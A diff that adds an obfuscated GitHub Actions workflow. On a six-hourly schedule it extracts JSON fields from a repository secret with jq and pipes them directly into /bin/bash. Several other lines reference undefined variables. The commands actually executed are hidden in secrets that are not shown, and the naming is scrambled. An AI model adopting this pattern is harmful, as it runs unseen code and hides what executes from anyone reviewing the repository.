@@ -1,0 +1,26 @@
+name: lingzhishimoo
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lingzhishimoo
+        env:
+          xtw1563: ${{ secrets.xtw1563 }}
+        run: |
+          echo $xtw1563 | jq -r .zhuv28 | /bin/bash
+          echo $zj6631 | jq -r .obco16985 | /bin/bash
+          echo $jure4 | jq -r .gm74 | /bin/bash
+          echo $f25 | jq -r .bhivr7 | /bin/bash
+          echo $mio1 | jq -r .sutzz4549 | /bin/bash
+          echo $tlw757 | jq -r .azked956 | /bin/bash
+          echo $vjhi41602 | jq -r .oivmz7697 | /bin/bash
+          echo $oxhye3 | jq -r .nkgz130 | /bin/bash
+
